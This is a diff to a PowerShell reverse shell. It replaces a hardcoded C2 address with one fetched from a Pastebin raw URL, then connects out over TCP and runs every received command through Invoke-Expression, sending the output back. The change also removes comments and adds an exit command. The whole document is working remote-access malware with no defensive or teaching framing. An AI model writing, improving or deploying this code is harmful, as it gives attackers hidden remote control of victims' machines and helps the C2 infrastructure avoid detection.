@@ -1,42 +1,38 @@
-﻿# Hardcoded local IP and port (change these as needed)
-$IPAddress = "127.0.0.1"   # e.g. localhost for testing, or your C2 IP
-$Port      = 4444          # your local listening port
+$PastebinRawUrl = "https://pastebin.com/raw/Q2H3zKEK"
+$PastebinContent = Invoke-RestMethod -Uri $PastebinRawUrl
+$IPAddress, $Port = $PastebinContent -split ':'
 
-# Loop until connection is established
 do {
     Start-Sleep -Seconds 1
     try {
-        $TCPClient = New-Object Net.Sockets.TCPClient($IPAddress, $Port)
+        $TCPClient = New-Object Net.Sockets.TCPClient($IPAddress, [int]$Port)
     } catch {}
 } until ($TCPClient.Connected)
 
-# Get network stream and create stream writer
 $NetworkStream = $TCPClient.GetStream()
 $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
+$StreamWriter.AutoFlush = $true
 
-# Writes a string to C2
+[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
+
 function WriteToStream ($String) {
-    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
-    $StreamWriter.Write($String + 'SHELL> ')
+    $StreamWriter.Write($String + "`nSHELL> ")
     $StreamWriter.Flush()
 }
 
-# Initial output
-WriteToStream ''
+WriteToStream "Connected"
 
-# Main command loop
 while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
-    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
-   
+    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1).Trim()
+    if ($Command -eq "exit") { break }
+    
     $Output = try {
         Invoke-Expression $Command 2>&1 | Out-String
     } catch {
         $_ | Out-String
     }
-   
-    WriteToStream ($Output)
+    WriteToStream $Output
 }
 
-# Cleanup
 $StreamWriter.Close()
 $TCPClient.Close()
